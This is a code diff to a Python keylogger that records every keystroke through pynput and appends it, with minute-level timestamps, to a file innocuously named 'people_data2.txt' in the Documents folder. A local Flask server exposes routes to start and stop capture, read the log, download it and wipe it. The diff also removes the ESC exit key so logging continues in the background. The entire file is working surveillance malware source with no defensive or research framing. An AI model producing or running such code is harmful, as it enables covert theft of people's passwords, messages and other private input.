@@ -1,20 +1,22 @@
 import os
 import threading
+import time
 from datetime import datetime
 from pynput import keyboard
 from flask import Flask, request
+from flask import send_file
 
-# Setup storage path in Documents
+# Log file in Documents folder
 documents_path = os.path.join(os.path.expanduser("~"), "Documents")
 os.makedirs(documents_path, exist_ok=True)
-people_file_path = os.path.join(documents_path, "people_data.txt")
+people_file_path = os.path.join(documents_path, "people_data2.txt")
 
 # Runtime state
-data_buffer = []
 capture_enabled = False
 kill_switch = False
+last_logged_minute = None
+lock = threading.Lock()
 
-# Flask control app
 app = Flask(__name__)
 
 @app.route('/start', methods=['POST'])
@@ -31,17 +33,31 @@ def stop_capture():
 
 @app.route('/getpeople', methods=['GET'])
 def get_people():
-    return ''.join(data_buffer), 200
+    try:
+        with open(people_file_path, "r", encoding="utf-8") as f:
+            return f.read(), 200
+    except Exception as e:
+        return f"Error reading log file: {e}", 500
 
 def write_data(data):
-    with open(people_file_path, "a", encoding="utf-8") as f:
-        f.write(data)
+    with lock:
+        with open(people_file_path, "a", encoding="utf-8") as f:
+            f.write(data)
+
+def maybe_add_timestamp():
+    global last_logged_minute
+    now = datetime.now()
+    current_minute = now.strftime('%Y-%m-%d %H:%M')
+    if current_minute != last_logged_minute:
+        last_logged_minute = current_minute
+        timestamp = f"\n[TIMESTAMP] {now.strftime('%Y-%m-%d %H:%M:%S')}\n"
+        write_data(timestamp)
 
 def on_key_press(key):
-    global kill_switch
-
     if not capture_enabled:
         return
+
+    maybe_add_timestamp()
 
     try:
         key_str = key.char
@@ -54,25 +70,51 @@ def on_key_press(key):
             keyboard.Key.esc: "[ESC]"
         }.get(key, f"[{key.name.upper()}]")
 
-        if key == keyboard.Key.esc:
-            print("[INFO] ESC pressed. Exiting.")
-            kill_switch = True
-            return False
-
-    data_buffer.append(key_str)
     write_data(key_str)
 
-def run_flask():
+def start_flask():
     app.run(port=5000, debug=False)
 
-if __name__ == '__main__':
-    print(f"[INFO] Agent running. Data stored at: {people_file_path}")
+def start_keylogger():
+    listener = keyboard.Listener(on_press=on_key_press)
+    listener.start()
+    return listener
 
-    flask_thread = threading.Thread(target=run_flask)
-    flask_thread.daemon = True
+
+
+@app.route('/download', methods=['GET'])
+def download_log():
+    try:
+        return send_file(people_file_path, as_attachment=True)
+    except Exception as e:
+        return f"Error downloading file: {e}", 500
+
+
+@app.route('/clear', methods=['POST'])
+def clear_log():
+    try:
+        with lock:
+            open(people_file_path, "w", encoding="utf-8").close()
+        return "Log cleared", 200
+    except Exception as e:
+        return f"Error clearing log: {e}", 500
+    
+
+if __name__ == '__main__':
+    print(f"[INFO] Agent running. Logging to: {people_file_path}")
+
+    # Start Flask server in background
+    flask_thread = threading.Thread(target=start_flask, daemon=True)
     flask_thread.start()
 
-    with keyboard.Listener(on_press=on_key_press) as listener:
-        listener.join()
+    # Start keylogger
+    listener = start_keylogger()
 
-    print("[INFO] Agent stopped.")
+    try:
+        while True:
+            time.sleep(1)
+    except KeyboardInterrupt:
+        print("\n[INFO] CTRL+C detected. Stopping...")
+        listener.stop()
+        listener.join()
+        print("[INFO] Agent stopped.")
